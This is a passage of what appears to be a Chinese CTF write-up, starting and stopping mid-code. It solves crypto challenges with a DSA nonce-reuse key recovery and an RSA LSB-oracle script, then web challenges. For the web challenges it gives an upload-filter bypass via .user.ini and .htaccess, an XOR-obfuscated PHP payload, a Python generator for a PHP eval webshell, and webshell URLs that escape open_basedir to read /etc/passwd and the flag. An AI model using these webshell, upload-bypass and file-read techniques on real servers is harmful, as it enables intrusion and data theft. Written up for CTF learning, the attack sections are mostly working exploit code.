class="line">p.recvuntil(<span class="string">"ms[3] = "</span>)</span><br><span class="line">p.sendline(hex(m4))</span><br><span class="line"></span><br><span class="line">print(p.recvline().strip())</span><br></pre></td></tr></table></figure>
<h2 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819110748-864d63d8-c22e-1.png" alt="image.png"><br>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric.rsa <span class="keyword">import</span> _modinv</span><br><span class="line"></span><br><span class="line">p = <span class="number">89884656743115795580686663829063433723705316331915518116995555215732107995059028542508401244839154951727540560161931978595376162965578570688594466436802284147607626105578924348149452183916543288346766737451989059750506942292767656446346135964708979885460659773076011464167414551120634816058711585048191954497</span></span><br><span class="line">q = <span class="number">1111804377363103506497255080558092668997313464491</span></span><br><span class="line">g = <span class="number">81015871603456981032885262867256289415428185718067221863176015480426278916784273932461088597278453025238130171264554340337052290801398971212149002598733514497274080038687844873045392142055341888546884513467006243654622193996237786587933291936305860861104505778330178660321910982065964185311229731036440300912</span></span><br><span class="line">y = <span class="number">24205967076065946398939942966555243225474145978138314135133201932616151998778053968114291774217862261420967723355996662814191035892360634754604901035581578539634376520187757713469318847622699231634156440729178396025399617453913697005440949117064991219553520585024955478025227096450962672242862991836900979588</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到一组同r的数据，m为字符串的md5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># And see the brave day sunk in hideous night</span></span><br><span class="line"><span class="comment"># Its MD5 digest: 189275664133327295485034625257633857845</span></span><br><span class="line"><span class="comment"># (1110285731834476772119910400331516120389395795749L, 671563422243860980520073471433161684440141852624L)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># And sable curls all silver'd o'er with white</span></span><br><span class="line"><span class="comment"># Its MD5 digest: 76447611971473350019028042637993930502</span></span><br><span class="line"><span class="comment"># (1110285731834476772119910400331516120389395795749L, 218895397309026853341136197466419726836220239272L)</span></span><br><span class="line"></span><br><span class="line">s0=<span class="number">671563422243860980520073471433161684440141852624</span></span><br><span class="line">s1=<span class="number">218895397309026853341136197466419726836220239272</span></span><br><span class="line"></span><br><span class="line">m0=<span class="number">189275664133327295485034625257633857845</span></span><br><span class="line">m1=<span class="number">76447611971473350019028042637993930502</span></span><br><span class="line"></span><br><span class="line">r= <span class="number">1110285731834476772119910400331516120389395795749</span></span><br><span class="line"></span><br><span class="line">dm=m1-m0</span><br><span class="line">ds=s1-s0</span><br><span class="line"></span><br><span class="line">k = gmpy2.mul(dm, gmpy2.invert(ds, q))</span><br><span class="line">k = gmpy2.f_mod(k, q)</span><br><span class="line">tmp = gmpy2.mul(k, s0) - m0</span><br><span class="line">x = tmp * gmpy2.invert(r, q)</span><br><span class="line">x = gmpy2.f_mod(x, q)</span><br><span class="line"></span><br><span class="line">data5=<span class="string">"""And nothing 'gainst Time's scythe can make defence"""</span></span><br><span class="line"></span><br><span class="line">kinv = _modinv(k, q)</span><br><span class="line">h = hashlib.md5(data5.encode()).digest()</span><br><span class="line">h = int.from_bytes(h, <span class="string">"big"</span>)</span><br><span class="line">s = kinv * (h + r * x) % q</span><br><span class="line">print(<span class="string">"("</span>+str(r)+<span class="string">"L, "</span>+str(int(s))+<span class="string">"L)"</span>)</span><br><span class="line"><span class="comment">#flag：flag&#123;Wh4t_a_Prety_Si3nature!&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="mt"><a href="#mt" class="headerlink" title="mt"></a>mt</h2><p>出题人加密很直观，明文不断的加密，最终的还是明文，所以直奔主题，payload如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(m)</span>:</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span><span class="params">(message)</span>:</span></span><br><span class="line">    new_message = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message) / <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line">c1 = <span class="string">'641460a9'</span></span><br><span class="line">c2 = <span class="string">'e3953b1a'</span></span><br><span class="line">c3 = <span class="string">'aa21f3a2'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(c)</span>:</span></span><br><span class="line"> x = c</span><br><span class="line"> <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">     xx = x</span><br><span class="line">     x = transform(x.decode(<span class="string">'hex'</span>)).encode(<span class="string">'hex'</span>)</span><br><span class="line">     <span class="keyword">if</span> x == c:</span><br><span class="line">         <span class="keyword">return</span> xx</span><br><span class="line"></span><br><span class="line">print(decode(c1)+decode(c2)+decode(c3))</span><br><span class="line"><span class="comment">#flag&#123;84b45f89af22ce7e67275bdc&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>lsb Oracal attack</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Please input your option:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"D"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Your encrypted message:"</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">"The plain of your decrypted message is "</span>)</span><br><span class="line">    lsb = p.recv(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> lsb == <span class="string">'odd'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c,e,n)</span>:</span></span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># for 'precise enough' floats</span></span><br><span class="line">    lo = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    hi = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            hi = (lo + hi) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lo = (lo + hi) / <span class="number">2</span></span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="keyword">print</span> i, int(hi - lo)</span><br><span class="line">    <span class="keyword">return</span> int(hi)</span><br><span class="line"></span><br><span class="line">s = <span class="string">"0123456789abcdefABCDEF"</span></span><br><span class="line">p = remote(<span class="string">"47.111.59.243"</span>,<span class="string">"9421"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"[*] Please find a string that md5(str + "</span>)</span><br><span class="line">salt = p.recv(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"[0:5] == "</span>)</span><br><span class="line">part_hash = p.recv(<span class="number">5</span>)</span><br><span class="line">found = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> s:</span><br><span class="line">                    ss = i+j+k+l+m</span><br><span class="line">                    <span class="keyword">if</span> md5(ss+salt).hexdigest()[:<span class="number">5</span>] == part_hash:</span><br><span class="line">                        found = <span class="number">1</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> found:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> found:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(ss)</span><br><span class="line">p.recvuntil(<span class="string">"Guess the Secrets 3 times, Then you will get the flag!\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    R = p.recvline().strip()</span><br><span class="line">    p.recvuntil(<span class="string">"n = "</span>)</span><br><span class="line">    n = eval(p.recvline().strip())</span><br><span class="line">    p.recvuntil(<span class="string">"e = "</span>)</span><br><span class="line">    e = eval(p.recvline().strip())</span><br><span class="line">    p.recvuntil(<span class="string">"The Encypted secret:"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"c = "</span>)</span><br><span class="line">    c = eval(p.recvline().strip())</span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>,e,n)</span><br><span class="line">    m = partial((c*c_of_2)%n,e,n)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input your option:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"G"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'The secret:'</span>)</span><br><span class="line">    p.sendline(str(m))</span><br><span class="line">    s = p.recvline().strip()</span><br><span class="line">    print(s)</span><br><span class="line">    log.success(s+<span class="string">' '</span>+R+<span class="string">" success!"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>题目功能是一个文件上传，可以上传jpg、png等文件，但是限制了php，而且还判断了上传的文件头，使用exif_image来判断的，这个很容易绕过，直接随便加一个图片文件头就行，并且上传之后会给出文件所在目录</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145315-04ce33a8-c24e-1.png" alt="1.png"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145317-05d44cb0-c24e-1.png" alt="2.png"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145322-09089396-c24e-1.png" alt="3.png"></p>
<p>尝试了.htaccess，发现不行，队里师傅突然说用<code>.user.ini</code>orz，第一次见还能这么做。先发下p牛的链接</p>
<p><a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">.user.ini文件构成的PHP后门</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145324-0a3d8f64-c24e-1.png" alt="4.png"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145326-0b2e9526-c24e-1.png" alt="5.png"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145330-0da74370-c24e-1.png" alt="6.png"></p>
<h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p><a href="https://blog.zeddyu.info/2019/07/20/isitdtu-2019/" target="_blank" rel="noopener">ISITDTU CTF 2019 EasyPHP 回顾</a></p>
<p>找到一篇类似的题，但是这里长度限制了18，太狠了，还过滤了字母数字。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145339-13215b10-c24e-1.png" alt="9.png"></p>
<p>于是谷歌了一番，找到了Smi1e师傅的一篇<a href="https://www.smi1e.top/php不使用数字字母和下划线写shell/" target="_blank" rel="noopener">文章</a>，结合陆队的blog，找到了思路</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145332-0f31b284-c24e-1.png" alt="7.png"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145337-11c75a26-c24e-1.png" alt="8.png"></p>
<p>经过摸索，找到payload</p>
<p>${&#37;A0&#37;B8&#37;BA&#37;AB^&#37;ff&#37;ff&#37;ff&#37;ff}{&#37;A0}();&amp;&#37;A0=get_the_flag</p>
<p>接下来就是上传了，说一下流程，上传一个.htaccess，然后getshell，直接贴脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span><span class="params">(filename, script)</span>:</span></span><br><span class="line">    phpfile = open(filename, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">    htaccess = open(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b'AddType application/x-httpd-php .south\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">"webshell.south"</span>, <span class="string">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure>
<p>把文件上传上去之后得到shell，发现有<code>open_basedir</code>，这里想到0CTF-TCTF final的绕过<code>open_basedir</code>任意文件读取</p>
<p><code>http://47.111.59.243:9001/upload/tmp_cc54f9a65160d1015e9d4b96601f1274/webshell.south?cmd=mkdir(&quot;/tmp/fuck&quot;);chdir(&#39;/tmp/fuck/&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(file_get_contents(&quot;/etc/passwd&quot;));</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145346-1716da7e-c24e-1.png" alt="12.png"></p>
<p><code>http://47.111.59.243:9001/upload/tmp_cc54f9a65160d1015e9d4b96601f1274/webshell.south?cmd=mkdir(&quot;/tmp/fuck&quot;);chdir(&#39;/tmp/fuck/&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145346-177d14e2-c24e-1.png" alt="13.png"></p>
<p><code>http://47.111.59.243:9001/upload/tmp_cc54f9a65160d1015e9d4b96601f1274/webshell.south?cmd=mkdir(&quot;/tmp/fuck&quot;);chdir(&#39;/tmp/fuck/&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);readfile(&quot;/THis_Is_tHe_F14g&quot;));</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145348-186f5a22-c24e-1.png" alt="14.png"></p>
<h2 id="Upload-labs-2"><a href="#Upload-labs-2" class="headerlink" title="Upload labs 2"></a>Upload labs 2</h2><p>这道题开放了不久，给了源码，接着审计一波,index.php上传这里没啥限制，限制了文件后缀</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line">$userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $file_name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $temp = explode(<span class="string">"."</span>, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = <span class="keyword">new</span> Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>func.php接受一个url参数，参数经过一个很狠的正则，会去你上传的目录找你上传的文件，获取MIME返回。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># func.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>class.php这里的File的__wakeup函数很异常，预计就是题目考点了，作用是创建一个类的新实例，给出的参数将传递到类的构造函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span 